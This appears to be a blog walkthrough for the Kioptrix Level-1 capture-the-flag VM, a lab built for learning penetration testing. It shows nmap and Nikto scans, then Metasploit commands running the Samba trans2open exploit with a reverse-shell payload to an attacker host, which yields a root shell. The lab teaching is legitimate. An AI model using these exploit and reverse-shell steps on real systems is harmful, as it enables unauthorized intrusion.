@@ -1,0 +1,176 @@
+
+								
+																		Hack The Kioptrix Level-1
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 28, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+You can Download it from here and run install in your VM.
+Table of content
+
+Network scaning
+Enumeration
+Exploitation
+Root access
+
+Lets start!!
+Turn on your attacking machine and use netdiscover command to scan your local network to get target IP.
+
+So we target at 192.168.1.109 let go for its enumeration and scan open ports and protocols. With help nmap aggressive scan we have observe several open port and service running on it.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.109
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.109
+					
+				
+			
+		
+
+
+We also use Nikto for scanning vulnerability with help of following command:
+
+		
+		
+			
+			
+			
+			
+nikto -h http://192.168.1.109
+			
+				
+					
+				
+					1
+				
+						nikto -h http://192.168.1.109
+					
+				
+			
+		
+
+It was very good to see the multiple vulnerability present in this lab.
+
+Since with help of above enumeration it becomes clear that the lab can exploit in multiple therefore without wasting time we execute following command with help of metasploit and try to comprise target’s VM machine.
+This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC.
+
+		
+		
+			
+			
+			
+			
+use exploit/linux/samba/trans2open
+msf exploit(linux/samba/trans2open) &gt; set rhost 192.168.1.109
+msf exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcp
+msf exploit(linux/samba/trans2open) &gt; set lhost 192.168.1.107
+msf exploit(linux/samba/trans2open) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/linux/samba/trans2openmsf exploit(linux/samba/trans2open) &gt; set rhost 192.168.1.109msf exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcpmsf exploit(linux/samba/trans2open) &gt; set lhost 192.168.1.107msf exploit(linux/samba/trans2open) &gt; exploit
+					
+				
+			
+		
+
+B0000MM!! Here we have command shell of victim’s machine with root access.
+
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
